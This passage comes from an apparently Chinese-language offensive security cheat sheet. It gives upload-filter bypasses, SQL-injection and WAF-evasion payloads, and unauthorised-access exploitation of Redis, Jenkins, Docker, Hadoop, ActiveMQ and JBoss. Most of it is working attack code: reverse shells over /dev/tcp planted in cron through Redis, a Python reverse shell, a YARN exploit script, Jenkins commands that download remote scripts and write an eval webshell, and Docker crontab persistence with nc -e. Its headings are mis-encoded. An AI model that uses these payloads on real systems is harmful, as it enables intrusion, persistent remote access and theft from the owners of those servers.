$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
       0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
       0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
       0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
       0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
       0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
       0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
       0x66, 0x44, 0x50, 0x33);
$img = imagecreatetruecolor(32, 32);
for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;
    $r = $p[$y];
    $g = $p[$y+1];
    $b = $p[$y+2];
    $color = imagecolorallocate($img, $r, $g, $b);
    imagesetpixel($img, round($y / 3), 0, $color);
&#125;
imagepng($img,&#39;./1.png&#39;);
?&gt;
</code></pre>
<h6 id="ä¸Šä¼ php3-php4-phtmlç­‰"><a href="#ä¸Šä¼ php3-php4-phtmlç­‰" class="headerlink" title="ä¸Šä¼ php3,php4,phtmlç­‰"></a>ä¸Šä¼ php3,php4,phtmlç­‰</h6><h6 id="æ–‡ä»¶åååŠ -DATA"><a href="#æ–‡ä»¶åååŠ -DATA" class="headerlink" title="æ–‡ä»¶åååŠ ::$DATA"></a>æ–‡ä»¶åååŠ ::$DATA</h6><pre><code>ConTent-Disposition: form-data; name=&quot;filepath&quot;; filename=&quot;1.asp::$DATA&quot;
ConTent-Disposition: form-data; name=&quot;filepath&quot;; filename=&quot;1.asp::$DATA\0x00\1.asp0x00.jpg&quot;
</code></pre>
<h6 id="asp-ç©ºæ ¼"><a href="#asp-ç©ºæ ¼" class="headerlink" title="asp . (ç©ºæ ¼+.)"></a>asp . (ç©ºæ ¼+.)</h6><h6 id="php-ç‚¹-ç©ºæ ¼-ç‚¹"><a href="#php-ç‚¹-ç©ºæ ¼-ç‚¹" class="headerlink" title="php. .(ç‚¹+ç©ºæ ¼+ç‚¹)"></a>php. .(ç‚¹+ç©ºæ ¼+ç‚¹)</h6><h6 id="åŒå†™phphpp"><a href="#åŒå†™phphpp" class="headerlink" title="åŒå†™phphpp"></a>åŒå†™phphpp</h6><h6 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="00æˆªæ–­"></a>00æˆªæ–­</h6><pre><code>Getå‚æ•°00æˆªæ–­ç›´æ¥æ·»åŠ %00
POSTå‚æ•°00æˆªæ–­ä¿®æ”¹hexä¸º00
</code></pre>
<h6 id="ä¿®æ”¹ä¸€äº›å›ºå®šçš„å‚æ•°"><a href="#ä¿®æ”¹ä¸€äº›å›ºå®šçš„å‚æ•°" class="headerlink" title="ä¿®æ”¹ä¸€äº›å›ºå®šçš„å‚æ•°"></a>ä¿®æ”¹ä¸€äº›å›ºå®šçš„å‚æ•°</h6><h6 id="æ–‡ä»¶åå»æ‰åŒå¼•å·"><a href="#æ–‡ä»¶åå»æ‰åŒå¼•å·" class="headerlink" title="æ–‡ä»¶åå»æ‰åŒå¼•å·"></a>æ–‡ä»¶åå»æ‰åŒå¼•å·</h6><h6 id="åŠ ä¸€ä¸ªfilename1çš„å‚æ•°"><a href="#åŠ ä¸€ä¸ªfilename1çš„å‚æ•°" class="headerlink" title="åŠ ä¸€ä¸ªfilename1çš„å‚æ•°"></a>åŠ ä¸€ä¸ªfilename1çš„å‚æ•°</h6><h6 id="formå˜é‡æ”¹æˆf-orm"><a href="#formå˜é‡æ”¹æˆf-orm" class="headerlink" title="formå˜é‡æ”¹æˆf+orm"></a>formå˜é‡æ”¹æˆf+orm</h6><h6 id="å»æ‰form-data"><a href="#å»æ‰form-data" class="headerlink" title="å»æ‰form-data"></a>å»æ‰form-data</h6><h6 id="åœ¨Content-Dispositionæˆ–form-data-åæ·»åŠ å¤šä¸ªç©ºæ ¼"><a href="#åœ¨Content-Dispositionæˆ–form-data-åæ·»åŠ å¤šä¸ªç©ºæ ¼" class="headerlink" title="åœ¨Content-Dispositionæˆ–form-data;åæ·»åŠ å¤šä¸ªç©ºæ ¼"></a>åœ¨Content-Dispositionæˆ–form-data;åæ·»åŠ å¤šä¸ªç©ºæ ¼</h6><h6 id="å¼•å·å›è½¦"><a href="#å¼•å·å›è½¦" class="headerlink" title="å¼•å·å›è½¦"></a>å¼•å·å›è½¦</h6><pre><code>ConTent-Disposition: form-data; name=&quot;filepath&quot;; filename=&quot;backlion.asp
&quot;
</code></pre>
<h6 id="Content-Typeå’ŒConTent-Dispositionè°ƒæ¢ä½ç½®"><a href="#Content-Typeå’ŒConTent-Dispositionè°ƒæ¢ä½ç½®" class="headerlink" title="Content-Typeå’ŒConTent-Dispositionè°ƒæ¢ä½ç½®"></a>Content-Typeå’ŒConTent-Dispositionè°ƒæ¢ä½ç½®</h6><h6 id="æ–‡ä»¶åå‰ç¼€åŠ ç©ºæ ¼"><a href="#æ–‡ä»¶åå‰ç¼€åŠ ç©ºæ ¼" class="headerlink" title="æ–‡ä»¶åå‰ç¼€åŠ ç©ºæ ¼"></a>æ–‡ä»¶åå‰ç¼€åŠ ç©ºæ ¼</h6><pre><code>filename=    &quot;1.asp&quot;
</code></pre>
<h6 id="nameå‰åŠ ç©ºæ ¼"><a href="#nameå‰åŠ ç©ºæ ¼" class="headerlink" title="nameå‰åŠ ç©ºæ ¼"></a>nameå‰åŠ ç©ºæ ¼</h6><pre><code>Content-Disposition: form-data;      name=&quot;uploaded&quot;; filename=&quot;1.asp&quot;
</code></pre>
<h6 id="form-dataçš„å‰ååŠ ä¸Š"><a href="#form-dataçš„å‰ååŠ ä¸Š" class="headerlink" title="form-dataçš„å‰ååŠ ä¸Š+"></a>form-dataçš„å‰ååŠ ä¸Š+</h6><pre><code>Content-Disposition: +form-data; name=&quot;filepath&quot;; filename=&quot;1.asp&quot;
</code></pre>
<h5 id="ASP-IIS"><a href="#ASP-IIS" class="headerlink" title="ASP+IIS"></a>ASP+IIS</h5><pre><code>s%elect&gt;select
s%u0065lect&gt;select  
s%u00f0lect&gt;select
s%u0045lect = s%u0065lect = %u00f0lect
u --&gt;%u0055 --&gt; %u0075
n --&gt;%u004e --&gt; %u006e
i --&gt;%u0049 --&gt; %u0069
o --&gt;%u004f --&gt; %u006f --&gt;%u00ba
s --&gt;%u0053 --&gt; %u0073
l --&gt;%u004c --&gt; %u006c
e --&gt;%u0045 --&gt; %u0065--&gt;%u00f0
c --&gt;%u0043 --&gt; %u0063
t --&gt;%u0054 --&gt;%u0074 --&gt;%u00de --&gt;%u00fe
f --&gt;%u0046 --&gt;%u0066
r --&gt;%u0052 --&gt;%u0072
m --&gt;%u004d --&gt;%u006d
</code></pre>
<h5 id="Asp-iis-amp-aspx-iis"><a href="#Asp-iis-amp-aspx-iis" class="headerlink" title="Asp+iis&amp;aspx+iis"></a>Asp+iis&amp;aspx+iis</h5><pre><code>s%u006c%u0006ect&gt;select
</code></pre>
<h5 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h5><pre><code>TEST /sql.php?id=1 HTTP/1.1
</code></pre>
<h5 id="å¤§å°å†™-å…³é”®å­—"><a href="#å¤§å°å†™-å…³é”®å­—" class="headerlink" title="å¤§å°å†™/å…³é”®å­—"></a>å¤§å°å†™/å…³é”®å­—</h5><pre><code>UniOn SeLECT
Mid()substring() ïƒ  substr()
Hex()ïƒ ascii()
sleep() =benchmark()
concat_ws()=group_concat()
</code></pre>
<h5 id="åŒé‡urlç¼–ç "><a href="#åŒé‡urlç¼–ç " class="headerlink" title="åŒé‡urlç¼–ç "></a>åŒé‡urlç¼–ç </h5><h5 id="å˜æ¢è¯·æ±‚æ–¹å¼"><a href="#å˜æ¢è¯·æ±‚æ–¹å¼" class="headerlink" title="å˜æ¢è¯·æ±‚æ–¹å¼"></a>å˜æ¢è¯·æ±‚æ–¹å¼</h5><h5 id="HPPå‚æ•°æ±¡æŸ“"><a href="#HPPå‚æ•°æ±¡æŸ“" class="headerlink" title="HPPå‚æ•°æ±¡æŸ“"></a>HPPå‚æ•°æ±¡æŸ“</h5><pre><code>id=1&amp;id=2&amp;id=3
å¾—åˆ°çš„ç»“æœï¼šAsp.net + iisï¼šid=1,2,3 
Asp+iisï¼šid=1,2,3 
Php+apacheï¼šid=3
MSSQL:
GET+POST: 
GET:http://192.168.125.140/test/sql.aspx?id=1 union/*
post:  id=2*/select null,null,null
æ— é€—å·å½¢å¼ï¼š
?id=1 union select 1&amp;id=2&amp;id=3&amp;id=4 from admin--ï¼ˆï¼‰  
åˆ©ç”¨é€—å·ï¼š
?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--
æ— æ•ˆå‚æ•°å½¢å¼ï¼š
?a=/*&amp;sql=xxx&amp;b=*/  a,bä¸ºæ— æ•ˆå‚æ•°
æº¢å‡ºå½¢å¼ï¼š?id=1/*&amp;id=*//*&amp;id=*//*......&amp;id=*//*&amp;id=*/ union  select null,system_user,null from INFORMATION_SCHEMA.schemata
MYSQLï¼š
?id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=â€¦.. &amp;id=1 union select 1,2 from admin
</code></pre>
<h5 id="æ•°æ®åº“-1"><a href="#æ•°æ®åº“-1" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h5><h6 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h6><pre><code>ç©ºæ ¼ç¬¦
%09ã€%0aã€%0cã€%0dã€%16
</code></pre>
<h6 id="Mysql-1"><a href="#Mysql-1" class="headerlink" title="Mysql"></a>Mysql</h6><pre><code>æ³¨é‡Šç¬¦
#ã€/*...*/ã€--[ç©ºæ ¼] ...
ç©ºæ ¼ç¬¦
[0x09,0x0a-0x0d,0x20,0xa0]
ç‰¹æ®Šç¬¦å·
%a æ¢è¡Œç¬¦ï¼Œå¯ç»“åˆæ³¨é‡Šç¬¦ä½¿ç”¨%23%0aï¼Œ%2d%2d%0aã€‚
%21  ï¼ å¹å·
%2b  +  åŠ å·
%2d  -  å‡å·
%40  @  ç¬¦å·
%7e   ~  æ³¢æµªå·
Id=1 union select(1),user()
Id=1 union /!12345select/1,user()
Id=1 union select@1,user()
Id=1 union select &#123;x 1&#125;,user()
Id=1 union select&quot;1&quot;,user()
Id=1 union select\N,user()
Id=1 union select 1,user()`
Id=1 union select 1,user()&quot;&quot;
Id=1 union select 1,user()A
Id=1 union select 1,user()`b
Id=1 union(select 1,(select/!schema_name/from information_schema.SCHEMATA limit 1,1))
Id=1 union(select 1,(select&#123;x schema_name&#125;from information_schema.SCHEMATA limit 1,1))
Id=1 union(select 1,(select(schema_name)from information_schema.SCHEMATA limit 1,1))
æµ®ç‚¹æ•°
Id= 1.0union select 1,user()
Id= 1.union select 1,user()
Id= 1E0union select 1,user()
Id=\Nunion select 1,user()
Id=1 unionselect user(),2.0from admin
Id=1 union select user(),8e0from admin
Id=1 union select user(),\Nfrom admin
å†…è”æ³¨é‡Š
/*!UnIon12345SelEcT*/ 1,user()   //æ•°å­—èŒƒå›´ 1000-50540
mysqlé»‘é­”æ³•
select&#123;x username&#125;from &#123;x11 test.admin&#125;;
å‡½æ•°
æˆªå–
Mid(version(),1,1)
Substr(version(),1,1)
Substring(version(),1,1)
Lpad(version(),1,1)
Rpad(version(),1,1)
Left(version(),1)
reverse(right(reverse(version()),1)) 
è¿æ¥
concat(version(),&#39;|&#39;,user());
concat_ws(&#39;|&#39;,1,2,3)
å­—ç¬¦è½¬æ¢
Ascii() Char() Hex() Unhex()
è¿‡æ»¤é€—å·
127&#39; UNION SELECT * FROM ((SELECT1)a JOIN (SELECT2)b JOIN (SELECT3)c JOIN (SELECT4)d JOIN (SELECT5)e)# 
ç›¸å½“äº union select 1,2,3,4,5
union select * from (select 1)a join(select&#123;x schema_name&#125; from information_schema.SCHEMATA limit 1,1)b
limit 1 offset 0ç›¸å½“äºlimit 1,0
mid(version() from 1 for 1)ç›¸å½“äºMid(version(),1,1)
&lt;&gt;è¢«è¿‡æ»¤
id=1 and ascii(substr(database(),0,1))&gt;64
æ¯”è¾ƒç¬¦
greatest(n1,n2,n3,ç­‰)å‡½æ•°è¿”å›è¾“å…¥å‚æ•°(n1,n2,n3,ç­‰)çš„æœ€å¤§å€¼
id=1 and greatest(ascii(substr(database(),0,1)),64)=64
å‡½æ•°æ„é€ 
sleep(5)/benchmark(10000000,SHA1(1))
id=1 xor sleep%23%0a(5)
id=1 xor sleep%2d%2d%0a(5)
id=1 xor sleep([%20]5) 
id=1 xor benchmark%0a(10000000,SHA1(1))
id=1 xor sleep[ç©ºç™½å­—ç¬¦](5)
select&#123;x[å¯å¡«å……å­—ç¬¦]1&#125;
</code></pre>
<h6 id="MSSQL-1"><a href="#MSSQL-1" class="headerlink" title="MSSQL"></a>MSSQL</h6><pre><code>æ³¨é‡Šç¬¦
/*ã€--ã€;00%ã€/**/
ç©ºæ ¼ç¬¦
[0x01-0x20][0x0a-0x0f][0x1a-0x-1f]
ç‰¹æ®Šç¬¦å·
%3a å†’å·
id=1 union:select 1,2 from:admin
id=1 union select+1,&#39;2&#39;,db_name() from admin
id=1 union select-1,&#39;2&#39;,db_name() from admin
id=1 union select.1,&#39;2&#39;,db_name() from admin
id=1 union select:1,&#39;2&#39;,db_name() from admin
id=1 union select~1,&#39;2&#39;,db_name() from admin
id=1%20union%20select%201,&#39;2&#39;,db_name()%80from%20admin
id=1 union select 1,&#39;2&#39;,db_name+() from admin
å‡½æ•°å˜å½¢: db_name[ç©ºç™½å­—ç¬¦]()
æµ®ç‚¹æ•°
id=1.1union select 1,&#39;2&#39;,db_name()
id=1e0union select 1,&#39;2&#39;,db_name()
è¿ç®—ç¬¦
id=1-1union select &#39;1&#39;,system_user,3 from admin
id=1e-union select &#39;1&#39;,system_user,3 from admin
å­—ç¬¦ä¸²æˆªå–å‡½æ•°
Substring(@@version,1,1)
Left(@@version,1)
Right(@@version,1)
charindex(&#39;test&#39;,db_name())
å­—ç¬¦ä¸²è½¬æ¢å‡½æ•°
Ascii(&#39;a&#39;)=char(97) æ‹¬å·ä¹‹é—´å¯æ·»åŠ ç©ºæ ¼
</code></pre>
<h5 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h5><pre><code>åŒæ—¶æäº¤GETå’ŒPOST
è®¿é—®HTTPç»•è¿‡å¯¹HTTPSçš„é˜²æŠ¤
%00æˆªæ–­
å‚æ•°å¡«å……åƒåœ¾æ•°æ®ï¼Œç¼“å†²åŒºæº¢å‡º
X-FORWARDED-FORä¼ªé€ ç»•è¿‡
é™æ€æ–‡ä»¶/sql.php/1.js?id=1ç»•è¿‡
ç™½åå•ç»•è¿‡ï¼ŒURLåªè¦å­˜åœ¨æŸå­—ç¬¦å°±ä¸ä¼šæ‹¦æˆª
/sql.php/admin.php?id=1
/sql.php?a=/manage/&amp;b=../etc/passwd
/../../../manage/../sql.asp?id=2
ä¼ªé€ User-agentç»•è¿‡ï¼Œå¯æ”¹ä¸ºçˆ¬è™«agent
</code></pre>
<h4 id="æœªæˆæƒè®¿é—®"><a href="#æœªæˆæƒè®¿é—®" class="headerlink" title="æœªæˆæƒè®¿é—®"></a>æœªæˆæƒè®¿é—®</h4><h5 id="Redisæœªæˆæƒè®¿é—®"><a href="#Redisæœªæˆæƒè®¿é—®" class="headerlink" title="Redisæœªæˆæƒè®¿é—®"></a>Redisæœªæˆæƒè®¿é—®</h5><h6 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h6><pre><code>&gt;redis-cli -h 127.0.0.1 flunshall 
192.168.0.110:6379&gt;ping
PONG å­˜åœ¨æœªæˆæƒè®¿é—®
</code></pre>
<h6 id="JSæ‰“å†…ç½‘"><a href="#JSæ‰“å†…ç½‘" class="headerlink" title="JSæ‰“å†…ç½‘"></a>JSæ‰“å†…ç½‘</h6><pre><code>var cmd = new XMLHttpRequest();      
cmd.open(&quot;POST&quot;, &quot;http://127.0.0.1:6379&quot;);      
cmd.send(&#39;flushall\r\n&#39;);             
var cmd =new XMLHttpRequest();      
cmd.open(&quot;POST&quot;, &quot;http://127.0.0.1:6379&quot;);      
cmd.send(&#39;eval \&#39;&#39; + &#39;redis.call(\&quot;set\&quot;,\&quot;1\&quot;,\&quot;\\n\\n*/1 * * * * /bin/bash -i &gt;&amp;/dev/tcp/å¤–ç½‘IP/5566 0&gt;&amp;1\\n\\n&quot;);redis.call(\&quot;config\&quot;, \&quot;set\&quot;, \&quot;dir\&quot;,\&quot;/var/spool/cron/\&quot;); redis.call(\&quot;config\&quot;,\&quot;set\&quot;, \&quot;dbfilename\&quot;, \&quot;root\&quot;);&#39; + &#39;\&#39; 0&#39; +&quot;\r\n&quot;);       
var cmd =new XMLHttpRequest();      
cmd.open(&quot;POST&quot;, &quot;http://127.0.0.1:6379&quot;);       
cmd.send(&#39;save\r\n&#39;);
</code></pre>
<h6 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h6><pre><code>ä¿å­˜ä¸ºsh
echo -e &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.108/12138 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -p $2 -x set 1
echo -e &quot;\n\n */1 * * * * python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.108&quot;,12138));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;\n\n&quot;|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir /var/spool/cron/
redis-cli -h $1 -p $2 config set dbfilename root
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit
æ‰§è¡Œ
&gt;bash 1.sh 192.168.0.120 6379
</code></pre>
<p><img src="./img/34.png" alt="image"><br><img src="./img/35.png" alt="image"></p>
<h6 id="å†™shell"><a href="#å†™shell" class="headerlink" title="å†™shell"></a>å†™shell</h6><pre><code>6379&gt; config set dir /var/www/html/
6379&gt; config set dbfilename shell.php
6379&gt; set x &quot;&lt;?php phpinfo();?&gt;&quot;
6379&gt; save
</code></pre>
<h6 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h6><pre><code>ssh-keygen
æœ¬åœ°ç”Ÿæˆä¸€å¯¹å¯†é’¥
https://github.com/JoyChou93/hackredis
&gt;ssh-keygen -t rsa -C &quot;xx@xx.com&quot;
&gt;(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; qq.txt
&gt;redis-cli -h 127.0.0.1 flunshall
&gt;cat qq.txt | redis-cli -h 127.0.0.1 -x set crackit
&gt;redis-cli -h 127.0.0.1
6379&gt; config set dir /root/.ssh/
6379&gt; config set dbfilename &quot;authorized_keys&quot;
6379&gt; save
æœ¬åœ°ç™»å½•
#ssh -i id_rsa root@11.11.11.11
</code></pre>
<h6 id="redis-rogue-getshell"><a href="#redis-rogue-getshell" class="headerlink" title="redis-rogue-getshell"></a>redis-rogue-getshell</h6><pre><code>https://github.com/vulhub/redis-rogue-getshell
éœ€è¦python3.0ä»¥ä¸Š
ç¼–è¯‘
&gt;cd RedisModulesSDK/
&gt;make
ä¼šåœ¨æ­¤ç›®å½•ä¸‹ç”Ÿæˆexp.so
æ‰§è¡Œå‘½ä»¤
&gt;python3 redis-master.py -r 192.168.0.120 -p 6379 -L 192.168.0.108 -P 12138 -f RedisModulesSDK/exp.so -c &quot;cat /etc/passwd&quot;
</code></pre>
<p><img src="./img/36.png" alt="image"></p>
<h6 id="redis-rogue-server"><a href="#redis-rogue-server" class="headerlink" title="redis-rogue-server"></a>redis-rogue-server</h6><pre><code>https://github.com/n0b0dyCN/redis-rogue-server
éœ€è¦python3.6ä»¥ä¸Š
ç¼–è¯‘
&gt;cd RedisModulesSDK/exp
&gt;make
æ‰§è¡Œ
&gt;./redis-rogue-server.py --rhost 192.168.0.120 --lhost 192.168.0.108
</code></pre>
<p><img src="./img/37.png" alt="image"><br><img src="./img/38.png" alt="image"></p>
<pre><code>ä¹Ÿå¯ä»¥åå‘shell
</code></pre>
<p><img src="./img/39.png" alt="image"><br><img src="./img/40.png" alt="image"></p>
<h6 id="redisåœ¨windowsä¸‹çš„åˆ©ç”¨"><a href="#redisåœ¨windowsä¸‹çš„åˆ©ç”¨" class="headerlink" title="redisåœ¨windowsä¸‹çš„åˆ©ç”¨"></a>redisåœ¨windowsä¸‹çš„åˆ©ç”¨</h6><pre><code>Webç›®å½•å†™å…¥æœ¨é©¬
å¯åŠ¨é¡¹
ç³»ç»ŸDLLåŠ«æŒ(ç›®æ ‡é‡å¯æˆ–æ³¨é”€)
ç‰¹å®šè½¯ä»¶çš„DLLåŠ«æŒ
è¦†ç›–å¿«æ·æ–¹å¼
è¦†ç›–é…ç½®æ–‡ä»¶
è¦†ç›–sethcç­‰æ–‡ä»¶
https://github.com/r35tart/RedisWriteFile
&gt;python3 rediswritefile.py --rhost=ç›®æ ‡IP --rport=6379 --lhost=æœ¬æœºIP --lport=æœ¬åœ°ç«¯å£ --rpath=&quot;åœ¨ç›®æ ‡ä¿å­˜çš„è·¯å¾„&quot; --rfile=&quot;åœ¨ç›®æ ‡ä¿å­˜çš„æ–‡ä»¶&quot; --lfile=&quot;æœ¬åœ°æ–‡ä»¶&quot; --auth=rediså¯†ç 
</code></pre>
<h6 id="Lua-RCE"><a href="#Lua-RCE" class="headerlink" title="Lua RCE"></a>Lua RCE</h6><pre><code>https://github.com/QAX-A-Team/redis_lua_exploit
ä¿®æ”¹redis_lua.pyé‡Œçš„ host ä¸ºç›®æ ‡ IP
æ‰§è¡Œè¿”å›æ­£å¸¸ï¼Œåå¼¹shell
&gt;eval &quot;tonumber(&#39;/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.108/12345 0&gt;&amp;1&#39;, 8)&quot; 0
</code></pre>
<h5 id="Jenkinsæœªæˆæƒè®¿é—®"><a href="#Jenkinsæœªæˆæƒè®¿é—®" class="headerlink" title="Jenkinsæœªæˆæƒè®¿é—®"></a>Jenkinsæœªæˆæƒè®¿é—®</h5><pre><code>http://www.qq.com:8080/manage
http://www.qq.com:8080/script
æ‰§è¡Œå‘½ä»¤
&gt;println &quot;ifconfig -a&quot;.execute().text
åå¼¹shell
&gt;println &quot;wget http://your.com/back.py -P /tmp/&quot;.execute().text
&gt;println &quot;python /tmp/back.py yourIP 8080&quot;.execute().text
å†™shell
&gt;println &quot;wget http://your.com/t.txt -o /var/www/html/1.php&quot;.execute().text
&gt;new File(&quot;/var/www/html/1.php&quot;).write(&#39;&lt;?php @eval($_POST[1]);?&gt;&#39;);
&gt;def webshell = &#39;&lt;?php @eval($_POST[1]);?&gt;&#39;
&gt;new File(&quot;/var/www/html/1.php&quot;).write(&quot;$webshell&quot;);
</code></pre>
<h5 id="MongoDBæœªæˆæƒè®¿é—®"><a href="#MongoDBæœªæˆæƒè®¿é—®" class="headerlink" title="MongoDBæœªæˆæƒè®¿é—®"></a>MongoDBæœªæˆæƒè®¿é—®</h5><pre><code>é»˜è®¤ç«¯å£27017ç›´æ¥è¿æ¥è¿›è¡Œå¢åˆ æ”¹æŸ¥
è¿æ¥å·¥å…·
https://s3.mongobooster.com/download/releasesv5/nosqlbooster4mongo-5.1.12.exe
</code></pre>
<h5 id="ZooKeeperæœªæˆæƒè®¿é—®"><a href="#ZooKeeperæœªæˆæƒè®¿é—®" class="headerlink" title="ZooKeeperæœªæˆæƒè®¿é—®"></a>ZooKeeperæœªæˆæƒè®¿é—®</h5><pre><code>é»˜è®¤ç«¯å£2181
è·å¾—æœåŠ¡å™¨ç¯å¢ƒä¿¡æ¯
&gt;echo envi|nc 192.168.0.1 2181
è¿æ¥
&gt;./zkCli.sh -server ip:port
è¿æ¥å·¥å…·
https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip
</code></pre>
<h5 id="Elasticsearchæœªæˆæƒè®¿é—®"><a href="#Elasticsearchæœªæˆæƒè®¿é—®" class="headerlink" title="Elasticsearchæœªæˆæƒè®¿é—®"></a>Elasticsearchæœªæˆæƒè®¿é—®</h5><pre><code>é»˜è®¤ç«¯å£9200
http://1.1.1.1:9200/_plugin/head/
http://1.1.1.1:9200/_nodes
http://1.1.1.1:9200/_river
http://1.1.1.1:9200/_plugin/sql/
</code></pre>
<h5 id="Memcacheæœªæˆæƒè®¿é—®"><a href="#Memcacheæœªæˆæƒè®¿é—®" class="headerlink" title="Memcacheæœªæˆæƒè®¿é—®"></a>Memcacheæœªæˆæƒè®¿é—®</h5><pre><code>é»˜è®¤ç«¯å£11211
&gt;telnet 1.1.1.1 11211
&gt;nc -vv 1.1.1.1 11211
</code></pre>
<h5 id="Hadoopæœªæˆæƒè®¿é—®"><a href="#Hadoopæœªæˆæƒè®¿é—®" class="headerlink" title="Hadoopæœªæˆæƒè®¿é—®"></a>Hadoopæœªæˆæƒè®¿é—®</h5><pre><code>http://192.168.1.1:8088/cluster
æœ¬åœ°ç›‘å¬ç«¯å£ &gt;&gt; åˆ›å»ºApplication &gt;&gt; è°ƒç”¨Submit Application APIæäº¤
</code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token keyword">import</span> requests

target <span class="token operator">=</span> <span class="token string">'http://192.168.18.129:8088/'</span>
lhost <span class="token operator">=</span> <span class="token string">'192.168.18.138'</span> <span class="token comment"># put your local host ip here, and listen at port 9999</span>

url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">'ws/v1/cluster/apps/new-application'</span>
resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
app_id <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'application-id'</span><span class="token punctuation">]</span>
url <span class="token operator">=</span> target <span class="token operator">+</span> <span class="token string">'ws/v1/cluster/apps'</span>
data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'application-id'</span><span class="token punctuation">:</span> app_id<span class="token punctuation">,</span>
    <span class="token string">'application-name'</span><span class="token punctuation">:</span> <span class="token string">'get-shell'</span><span class="token punctuation">,</span>
    <span class="token string">'am-container-spec'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
        <span class="token string">'commands'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>
            <span class="token string">'command'</span><span class="token punctuation">:</span> <span class="token string">'/bin/bash -i >&amp; /dev/tcp/%s/9999 0>&amp;1'</span> <span class="token operator">%</span> lhost<span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token string">'application-type'</span><span class="token punctuation">:</span> <span class="token string">'YARN'</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>
requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> json<span class="token operator">=</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="Dockeræœªæˆæƒè®¿é—®"><a href="#Dockeræœªæˆæƒè®¿é—®" class="headerlink" title="Dockeræœªæˆæƒè®¿é—®"></a>Dockeræœªæˆæƒè®¿é—®</h5><pre><code>é»˜è®¤ç«¯å£2375
&gt;docker -H tcp://1.1.1.1:2375 images
æœ¬åœ°ç›‘å¬
å¯åŠ¨å®¹å™¨
docker -H tcp://1.1.1.1:2375 run -id -v /etc/crontabs:/tmp alpine:latest
docker -H tcp://1.1.1.1:2375 ps
è¿›å…¥å®¹å™¨
docker -H tcp://1.1.1.1:2375 exec -it a8ff7ed880fb sh
echo &#39;* * * * * /usr/bin/nc &#123;vps_ip&#125; 9999 -e /bin/sh&#39; &gt;&gt; /tmp/root #æ·»åŠ è®¡åˆ’ä»»åŠ¡
cat /tmp/root 
exit
Shipyardé»˜è®¤å¯†ç 
admin/shipyard
</code></pre>
<h5 id="ActiveMQæœªæˆæƒè®¿é—®"><a href="#ActiveMQæœªæˆæƒè®¿é—®" class="headerlink" title="ActiveMQæœªæˆæƒè®¿é—®"></a>ActiveMQæœªæˆæƒè®¿é—®</h5><pre><code>é»˜è®¤ç«¯å£8161
http://1.1.1.1:8161/admin/connections.jsp
PUT /fileserver/%2F%2F2%083.jsp HTTP/1.0
Content-Length: 27
Host: 1.1.1.1:8161
Connection: Close
Authorization: Basic YWRtaW46YWRtaW4=
123123123123123123123123123
</code></pre>
<h5 id="JBOSSæœªæˆæƒè®¿é—®"><a href="#JBOSSæœªæˆæƒè®¿é—®" class="headerlink" title="JBOSSæœªæˆæƒè®¿é—®"></a>JBOSSæœªæˆæƒè®¿é—®</h5><pre><code>http://192.168.1.1:8080/jmx-console/ æ— éœ€è®¤è¯è¿›å…¥
jboss.deploymentéƒ¨ç½²shell
addURL()çš„paramValueå†™å…¥è¿œç¨‹waræœ¨é©¬åœ°å€
</code></pre>
